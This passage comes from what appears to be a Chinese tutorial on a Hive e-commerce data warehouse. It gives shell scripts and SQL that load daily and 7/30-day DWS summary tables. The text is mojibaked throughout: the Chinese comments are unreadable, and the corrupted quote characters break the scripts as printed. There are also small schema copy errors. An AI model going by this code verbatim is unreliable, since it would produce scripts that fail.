partition(dt)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count_1d,</p><p>sum(sku_num) order_num_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0.0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0.0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=â€™$do_dateâ€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>â€œ</p><p>dws_trade_user_sku_order_refund_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=â€™$do_dateâ€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>â€œ</p><p>dws_traffic_page_visitor_page_view_1d=â€</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>â€œ</p><p>dws_traffic_session_page_view_1d=â€</p><p>insert overwrite table ${APP}.dws_traffic_session_page_view_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><p>â€œ</p><p>case $1 in</p><p>â€œdws_trade_province_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_province_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_cart_add_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_cart_add_1dâ€</p><p>;;</p><p>â€œdws_trade_user_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_order_refund_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_order_refund_1dâ€</p><p>;;</p><p>â€œdws_trade_user_payment_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_payment_1dâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_refund_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_refund_1dâ€</p><p>;;</p><p>â€œdws_traffic_page_visitor_page_view_1dâ€ )</p><p>hive -e â€œ$dws_traffic_page_visitor_page_view_1dâ€</p><p>;;</p><p>â€œdws_traffic_session_page_view_1dâ€ )</p><p>hive -e â€œ$dws_traffic_session_page_view_1dâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dws_trade_province_order_1d$dws_trade_user_cart_add_1d$dws_trade_user_order_1d$dws_trade_user_order_refund_1d$dws_trade_user_payment_1d$dws_trade_user_sku_order_1d$dws_trade_user_sku_order_refund_1d$dws_traffic_page_visitor_page_view_1d$dws_traffic_session_page_view_1dâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dwd_to_dws_1d_init.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dwd_to_dws_1d_init.sh all 2020-06-14</p><p><strong>2ï¼‰æ¯æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdwd_to_dws_1d.sh</p><p>[atguigu@hadoop102 bin]$ vim dwd_to_dws_1d.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœè¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>dws_trade_province_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_province_order_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by province_id</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.dim_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)p</p><p>on o.province_id=p.id;</p><p>â€œ</p><p>dws_trade_user_cart_add_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num)</p><p>from ${APP}.dwd_trade_cart_add_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_1d partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount)</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_order_refund_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(refund_num),</p><p>sum(refund_amount)</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_payment_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_payment_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount)</p><p>from ${APP}.dwd_trade_pay_detail_suc_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_sku_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count,</p><p>order_num,</p><p>order_original_amount,</p><p>activity_reduce_amount,</p><p>coupon_reduce_amount,</p><p>order_total_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count,</p><p>sum(sku_num) order_num,</p><p>sum(split_original_amount) order_original_amount,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount,</p><p>sum(split_total_amount) order_total_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=â€™$do_dateâ€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>â€œ</p><p>dws_trade_user_sku_order_refund_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_refund_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=â€™$do_dateâ€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>â€œ</p><p>dws_traffic_page_visitor_page_view_1d=â€</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>â€œ</p><p>dws_traffic_session_page_view_1d=â€</p><p>insert overwrite table ${APP}.dws_traffic_session_page_view_1d<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=â€™$do_dateâ€™</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><p>â€œ</p><p>case $1 in</p><p>â€œdws_trade_province_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_province_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_cart_add_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_cart_add_1dâ€</p><p>;;</p><p>â€œdws_trade_user_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_order_refund_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_order_refund_1dâ€</p><p>;;</p><p>â€œdws_trade_user_payment_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_payment_1dâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_1dâ€</p><p>;;</p><p>â€œdws_trade_user_sku_order_refund_1dâ€ )</p><p>hive -e â€œ$dws_trade_user_sku_order_refund_1dâ€</p><p>;;</p><p>â€œdws_traffic_page_visitor_page_view_1dâ€ )</p><p>hive -e â€œ$dws_traffic_page_visitor_page_view_1dâ€</p><p>;;</p><p>â€œdws_traffic_session_page_view_1dâ€ )</p><p>hive -e â€œ$dws_traffic_session_page_view_1dâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dws_trade_province_order_1d$dws_trade_user_cart_add_1d$dws_trade_user_order_1d$dws_trade_user_order_refund_1d$dws_trade_user_payment_1d$dws_trade_user_sku_order_1d$dws_trade_user_sku_order_refund_1d$dws_traffic_page_visitor_page_view_1d$dws_traffic_session_page_view_1dâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x dwd_to_dws_1d.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ dwd_to_dws_1d.sh all 2020-06-14</p><h3 id="æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h3><h4 id="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`sku_name` STRING COMMENT â€˜skuåç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_count_7d` STRING COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•ä»¶æ•°â€™,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™,</p><p>`order_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•ä»¶æ•°â€™,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_sku_order_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_sku_order_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_user_sku_order_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_refund_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_refund_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`sku_name` STRING COMMENT â€˜skuåç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_refund_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥é€€å•ä»¶æ•°â€™,</p><p>`order_refund_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥é€€å•é‡‘é¢â€™,</p><p>`order_refund_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥é€€å•ä»¶æ•°â€™,</p><p>`order_refund_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥é€€å•é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_sku_order_refund_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_sku_order_refund_nd<br>partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`order_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•å•†å“ä»¶æ•°â€™,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™,</p><p>`order_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•å•†å“ä»¶æ•°â€™,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>â€˜æœ€è¿‘30æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>â€˜æœ€è¿‘30æ—¥ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_order_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_user_order_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_cart_add_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_cart_add_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`cart_add_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥åŠ 